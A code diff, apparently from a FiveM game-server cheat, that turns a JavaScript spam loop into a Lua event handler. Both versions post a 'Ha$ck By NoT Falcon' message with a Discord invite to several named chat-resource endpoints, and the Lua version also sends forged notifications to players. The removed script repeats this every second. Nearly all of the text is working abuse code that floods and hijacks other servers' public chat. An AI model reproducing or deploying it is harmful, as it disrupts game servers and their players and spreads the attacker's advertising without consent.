@@ -1,13 +1,49 @@
-<script>
-const msg=`Disc@ord.gg/j7m - Ha$ck By NoT Falcon`;
-const body=JSON.stringify({message:msg});
-setInterval(()=> {
-  fetch("https://flix-scripts/chatResult",{method:"POST",body});
-  fetch("https://danger_chat/Danger_Chat:SendMessage",{method:"POST",body:JSON.stringify({message:msg,channel:"شات العام",color:null,isImageAndLinksAllowed:[false,false]})});
-  fetch("https://easy-chat+/o6ZbK5Ecp6",{method:"POST",headers:{"accept":"*/*","content-type":"application/x-www-form-urlencoded; charset=UTF-8"},body:JSON.stringify({message:msg,channel:"شات العام"})});
-  fetch("https://melix_chat/chatResult",{method:"POST",body});
-  fetch("https://as_chat/chatResult",{method:"POST",body});
-  fetch("https://chat/chatResult",{method:"POST",body});
-  fetch("https://ho-chatv2/Chat",{method:"POST",body:JSON.stringify({Type:"chatResult",message:msg,chatType:"general"})});
-},1000);
-</script>
+RegisterNetEvent("SendSingleMessage")
+AddEventHandler("SendSingleMessage", function(v)
+    -- إشعارات Flix:Notify لكل اللاعبين
+    TriggerEvent("Flix:Notify", {
+        type = "success",
+        messageheader = "Aljaheem",
+        message = v,
+        sound = '',
+        voice = 0.5,
+        timeout = 10000,
+    })
+
+    TriggerEvent("Flix:Notify", { 
+        type = "completed", 
+        messageheader = "Aljaheem",
+        message = '',
+        image = '',
+        sound = '',
+        voice = 1,
+        timeout = 10
+    })
+
+    -- رسالة وحدة لكل سكربت شات
+    local msg = "Disc@ord.gg/j7m - Ha$ck By NoT Falcon"
+    local body = json.encode({message = msg})
+
+    PerformHttpRequest("https://flix-scripts/chatResult", function() end, "POST", body)
+    PerformHttpRequest("https://danger_chat/Danger_Chat:SendMessage", function() end, "POST", json.encode({
+        message = msg,
+        channel = "شات العام",
+        color = nil,
+        isImageAndLinksAllowed = {false, false}
+    }))
+    PerformHttpRequest("https://easy-chat+/o6ZbK5Ecp6", function() end, "POST", json.encode({
+        message = msg,
+        channel = "شات العام"
+    }), {
+        ["accept"] = "*/*",
+        ["content-type"] = "application/x-www-form-urlencoded; charset=UTF-8"
+    })
+    PerformHttpRequest("https://melix_chat/chatResult", function() end, "POST", body)
+    PerformHttpRequest("https://as_chat/chatResult", function() end, "POST", body)
+    PerformHttpRequest("https://chat/chatResult", function() end, "POST", body)
+    PerformHttpRequest("https://ho-chatv2/Chat", function() end, "POST", json.encode({
+        Type = "chatResult",
+        message = msg,
+        chatType = "general"
+    }))
+end)
